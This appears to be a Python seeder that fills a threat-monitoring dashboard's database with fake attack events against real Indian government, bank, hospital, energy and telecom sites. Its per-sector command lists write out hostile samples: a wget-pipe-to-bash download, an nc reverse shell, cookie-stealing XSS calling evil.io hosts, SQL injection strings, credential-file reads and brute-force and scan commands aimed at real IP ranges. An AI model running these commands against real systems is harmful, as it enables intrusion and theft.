"""
Sector Monitor Fake Data Seeder
================================
Populates SectorTarget and SectorEvent tables ONLY.
Touches nothing else in the database.

Run from the backend/ directory:
    python seed_sectors.py
"""

import asyncio
import random
import uuid
from datetime import datetime, timedelta

from sqlalchemy import select
from app.db.sqlite_db import AsyncSessionLocal
from app.models.all_models import SectorTarget, SectorEvent

# ── Sector definitions ─────────────────────────────────────────────────────────

SECTORS = {
    "edu": {
        "targets": [
            ("Delhi University Portal",     "https://du.ac.in",         "103.21.58.10",  "National university student portal"),
            ("IIT Bombay LMS",              "https://lms.iitb.ac.in",   "14.139.34.5",   "E-learning management system"),
            ("CBSE Student Board",          "https://cbse.nic.in",       "14.140.38.9",   "Board exam result portal"),
        ],
        "attack_types": ["SQLi", "XSS", "BruteForce", "Scan"],
        "paths": ["/login", "/result", "/admin/panel", "/student?id=", "/search?q="],
        "commands": [
            ["whoami", "uname -a", "cat /etc/passwd"],
            ["SELECT * FROM students", "DROP TABLE results", "UNION SELECT 1,2,3--"],
            ["<script>alert(1)</script>", "javascript:void(0)"],
        ],
        "countries": ["CN", "RU", "PK", "BD", "IR"],
        "risk_range": (4.0, 9.5),
    },
    "defence": {
        "targets": [
            ("MoD Public Portal",           "https://mod.gov.in",        "164.100.58.3",  "Ministry of Defence web gateway"),
            ("Armed Forces Recruitment",    "https://joinindianarmy.nic.in", "14.143.15.2", "Recruitment and authentication portal"),
            ("DRDO Research Gateway",       "https://drdo.gov.in",       "14.139.217.11", "Research publications & access control"),
        ],
        "attack_types": ["RCE", "BruteForce", "Scan", "SQLi"],
        "paths": ["/admin", "/api/login", "/api/v1/users", "/.env", "/wp-admin"],
        "commands": [
            ["nmap -sV 164.100.58.3", "hydra -l admin -P wordlist.txt"],
            ["curl -X POST /api/exec --data 'cmd=id'", "wget http://evil.ru/shell.sh | bash"],
            ["cat /etc/shadow", "id", "nc -e /bin/bash 45.33.32.156 4444"],
        ],
        "countries": ["CN", "RU", "PK", "US", "KP"],
        "risk_range": (6.0, 10.0),
    },
    "medicare": {
        "targets": [
            ("AIIMS Patient Portal",        "https://aiims.edu",         "14.139.34.100", "Patient records and appointment system"),
            ("Ayushman Bharat Gateway",     "https://pmjay.gov.in",      "164.100.14.1",  "Health insurance scheme portal"),
            ("Apollo Hospital Network",     "https://apollohospitals.com","103.198.38.5", "Private hospital patient system"),
        ],
        "attack_types": ["SQLi", "XSS", "BruteForce", "Other"],
        "paths": ["/patient/records", "/api/prescriptions", "/admin/users", "/search?patient="],
        "commands": [
            ["SELECT * FROM patients WHERE id=1 OR 1=1", "UNION SELECT name,dob,ssn FROM patients--"],
            ["<img src=x onerror=fetch('https://evil.io/?c='+document.cookie)>"],
            ["admin", "password123", "hospital@2024"],
        ],
        "countries": ["CN", "NG", "RO", "UA", "BR"],
        "risk_range": (3.5, 9.0),
    },
    "commerce": {
        "targets": [
            ("IRCTC Booking Engine",        "https://irctc.co.in",       "103.135.4.1",   "National rail ticket booking"),
            ("GeM Government Marketplace",  "https://gem.gov.in",        "164.100.17.5",  "Govt e-marketplace procurement"),
            ("Amazon India Payments",       "https://pay.amazon.in",     "52.95.116.115", "Payment gateway layer"),
        ],
        "attack_types": ["SQLi", "BruteForce", "XSS", "Scan"],
        "paths": ["/checkout", "/api/payment", "/user/account", "/admin/orders"],
        "commands": [
            ["'; DROP TABLE orders; --", "SELECT card_number FROM payments--"],
            ["curl -d 'amount=-9999' /api/payment", "replay_token=OLD_JWT_HERE"],
            ["<script>document.location='http://evil.io?s='+document.cookie</script>"],
        ],
        "countries": ["CN", "US", "RU", "NG", "VN"],
        "risk_range": (4.0, 9.5),
    },
    "finance": {
        "targets": [
            ("SBI Internet Banking",        "https://onlinesbi.sbi",     "117.239.97.51", "State Bank retail banking portal"),
            ("RBI Regulatory Gateway",      "https://rbi.org.in",        "164.100.42.7",  "Reserve Bank of India public portal"),
            ("NPCI UPI Platform",           "https://www.npci.org.in",   "103.18.68.10",  "Unified payments infrastructure"),
        ],
        "attack_types": ["BruteForce", "SQLi", "RCE", "XSS"],
        "paths": ["/login", "/transfer", "/api/otp/verify", "/admin/accounts"],
        "commands": [
            ["hydra -l admin -P rockyou.txt sbi.onlinesbi.com http-post-form"],
            ["curl -X POST /api/transfer --data 'to=attacker&amount=100000'"],
            ["SELECT account_number,balance FROM accounts WHERE user_id=1 OR 1=1--"],
        ],
        "countries": ["CN", "RU", "PK", "NG", "UA"],
        "risk_range": (6.5, 10.0),
    },
    "gov": {
        "targets": [
            ("Aadhaar UIDAI Portal",        "https://uidai.gov.in",      "164.100.16.1",  "National biometric identity system"),
            ("PM India Official Site",      "https://pmindia.gov.in",    "164.100.20.10", "Prime Minister's Office web portal"),
            ("MHA Home Ministry Portal",    "https://mha.gov.in",        "164.100.25.6",  "Ministry of Home Affairs gateway"),
        ],
        "attack_types": ["RCE", "SQLi", "Scan", "BruteForce"],
        "paths": ["/api/aadhaar/verify", "/admin", "/login", "/.git/config", "/backup.zip"],
        "commands": [
            ["nmap -A -T4 164.100.16.1/24", "masscan --rate=1000 164.100.0.0/16 -p80,443,22"],
            ["curl -sk https://uidai.gov.in/.git/config", "wget /etc/passwd"],
            ["SELECT * FROM citizens WHERE aadhaar LIKE '%%%%'"],
        ],
        "countries": ["CN", "PK", "KP", "RU", "TR"],
        "risk_range": (7.0, 10.0),
    },
    "energy": {
        "targets": [
            ("NTPC Power Grid Monitor",     "https://ntpclimited.com",   "117.241.38.10", "National thermal power SCADA interface"),
            ("ONGC Upstream Portal",        "https://ongcindia.com",     "117.199.48.5",  "Oil & gas field management system"),
            ("Solar Energy Corp (SECI)",    "https://seci.co.in",        "103.75.118.4",  "Renewable energy project dashboard"),
        ],
        "attack_types": ["RCE", "Scan", "BruteForce", "Other"],
        "paths": ["/scada/api", "/modbus", "/admin/control", "/api/grid/status"],
        "commands": [
            ["python3 ics_exploit.py --target 117.241.38.10 --port 502"],
            ["nmap --script modbus-discover -p 502 117.241.38.10"],
            ["echo 0 > /sys/class/thermal/thermal_zone0/temp", "shutdown -h now"],
        ],
        "countries": ["CN", "RU", "IR", "KP", "PK"],
        "risk_range": (7.5, 10.0),
    },
    "telecom": {
        "targets": [
            ("Jio Network OAM System",      "https://jio.com",           "49.40.116.10",  "Operator administration & management"),
            ("BSNL Core Infrastructure",    "https://bsnl.co.in",        "117.195.15.3",  "State telecom backbone portal"),
            ("TRAI Regulatory Portal",      "https://trai.gov.in",       "164.100.33.8",  "Telecom regulatory authority gateway"),
        ],
        "attack_types": ["Scan", "BruteForce", "SQLi", "RCE"],
        "paths": ["/api/subscribers", "/admin/network", "/sim/activate", "/billing/export"],
        "commands": [
            ["SELECT msisdn,imei FROM subscribers LIMIT 10000"],
            ["nmap -sS -p1-65535 49.40.116.0/24"],
            ["curl -X DELETE /api/tower/45 -H 'Authorization: Bearer LEAKED_TOKEN'"],
        ],
        "countries": ["CN", "PK", "RU", "BD", "MM"],
        "risk_range": (5.0, 9.5),
    },
    "transport": {
        "targets": [
            ("DGCA Aviation Portal",        "https://dgca.gov.in",       "164.100.55.2",  "Civil aviation authority web gateway"),
            ("Mumbai Port Trust System",    "https://mumbaiport.gov.in", "103.91.68.10",  "Maritime cargo and vessel tracking"),
            ("NHAI Highway Management",     "https://nhai.gov.in",       "117.239.105.5", "National highway authority system"),
        ],
        "attack_types": ["SQLi", "XSS", "Scan", "BruteForce"],
        "paths": ["/flight/manifest", "/cargo/tracking", "/api/vessels", "/admin/tolls"],
        "commands": [
            ["SELECT flight_id,passenger_list FROM manifests WHERE date='2026-03-23'"],
            ["<svg onload=fetch('https://c2.evil.io/?data='+btoa(document.body.innerHTML))>"],
            ["nmap -sV -p 80,443,8080,8443 103.91.68.0/24"],
        ],
        "countries": ["CN", "PK", "RU", "TR", "NG"],
        "risk_range": (4.0, 9.0),
    },
}

# ── Fake attacker IPs per region ───────────────────────────────────────────────

COUNTRY_IPS = {
    "CN": ["223.166.18.{}".format(i) for i in range(10, 60)],
    "RU": ["185.220.101.{}".format(i) for i in range(1, 50)],
    "PK": ["39.35.200.{}".format(i) for i in range(5, 40)],
    "US": ["104.244.72.{}".format(i) for i in range(1, 30)],
    "KP": ["175.45.176.{}".format(i) for i in range(1, 20)],
    "IR": ["5.160.10.{}".format(i) for i in range(1, 30)],
    "NG": ["41.217.204.{}".format(i) for i in range(1, 30)],
    "RO": ["5.2.72.{}".format(i) for i in range(1, 30)],
    "UA": ["93.183.68.{}".format(i) for i in range(1, 30)],
    "BR": ["177.34.56.{}".format(i) for i in range(1, 30)],
    "VN": ["113.160.9.{}".format(i) for i in range(1, 30)],
    "TR": ["31.145.78.{}".format(i) for i in range(1, 30)],
    "BD": ["103.78.68.{}".format(i) for i in range(1, 30)],
    "MM": ["203.81.64.{}".format(i) for i in range(1, 30)],
}

IOC_TEMPLATES = {
    "ip":     lambda ip: ip,
    "domain": lambda _: random.choice(["evil-c2.ru", "malware-host.cn", "attack.ir", "payload.kp", "dropper.ng"]),
    "hash":   lambda _: uuid.uuid4().hex[:32],
    "url":    lambda _: random.choice([
        "http://evil.io/shell.php",
        "https://c2.ru/payload.exe",
        "http://malware.cn/dropper.bin",
    ]),
}

USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "python-requests/2.28.0",
    "curl/7.88.0",
    "sqlmap/1.7.8#stable",
    "Nikto/2.1.6",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Go-http-client/1.1",
    "masscan/1.3.2",
    "zgrab/0.x",
]


def random_ts(hours_back: int = 72) -> datetime:
    """Return a random timestamp within the last N hours."""
    delta = random.uniform(0, hours_back * 3600)
    return datetime.utcnow() - timedelta(seconds=delta)


async def seed():
    async with AsyncSessionLocal() as db:

        # ── Wipe existing sector data only ────────────────────────────────────
        existing_events = await db.execute(select(SectorEvent))
        for ev in existing_events.scalars().all():
            await db.delete(ev)

        existing_targets = await db.execute(select(SectorTarget))
        for tgt in existing_targets.scalars().all():
            await db.delete(tgt)

        await db.commit()
        print("Cleared existing sector targets and events.")

        total_targets = 0
        total_events  = 0

        for sector_key, cfg in SECTORS.items():
            targets_created = []

            # ── Create targets for this sector ────────────────────────────────
            for name, url, ip, desc in cfg["targets"]:
                target = SectorTarget(
                    sector_key=sector_key,
                    name=name,
                    url=url,
                    ip=ip,
                    description=desc,
                    active=True,
                )
                db.add(target)
                await db.flush()  # get the generated id + api_key
                targets_created.append(target)
                total_targets += 1

            await db.commit()

            # ── Generate events spread across the targets ─────────────────────
            events_per_sector = random.randint(80, 140)
            risk_lo, risk_hi  = cfg["risk_range"]

            for _ in range(events_per_sector):
                target   = random.choice(targets_created)
                country  = random.choice(cfg["countries"])
                ip_pool  = COUNTRY_IPS.get(country, ["1.2.3.4"])
                attacker = random.choice(ip_pool)

                attack_type = random.choice(cfg["attack_types"])
                risk        = round(random.uniform(risk_lo, risk_hi), 1)

                ioc_type  = random.choice(["ip", "domain", "hash", "url"])
                ioc_value = IOC_TEMPLATES[ioc_type](attacker)

                cmds = random.choice(cfg["commands"]) if random.random() > 0.4 else None
                path = random.choice(cfg["paths"])
                ua   = random.choice(USER_AGENTS)

                event = SectorEvent(
                    sector_key=sector_key,
                    target_id=target.id,
                    target_url=target.url or target.ip,
                    attacker_ip=attacker,
                    country=country,
                    attack_type=attack_type,
                    commands=cmds,
                    ioc_value=ioc_value,
                    ioc_type=ioc_type,
                    risk_score=risk,
                    user_agent=ua,
                    request_path=path,
                    raw_payload=f'{{"ip":"{attacker}","path":"{path}","attack":"{attack_type}"}}',
                    timestamp=random_ts(72),
                )
                db.add(event)
                total_events += 1

            await db.commit()
            print(f"  [{sector_key:10s}] {len(targets_created)} targets | {events_per_sector} events")

        print(f"\nDone. {total_targets} targets and {total_events} events seeded across {len(SECTORS)} sectors.")


if __name__ == "__main__":
    asyncio.run(seed())
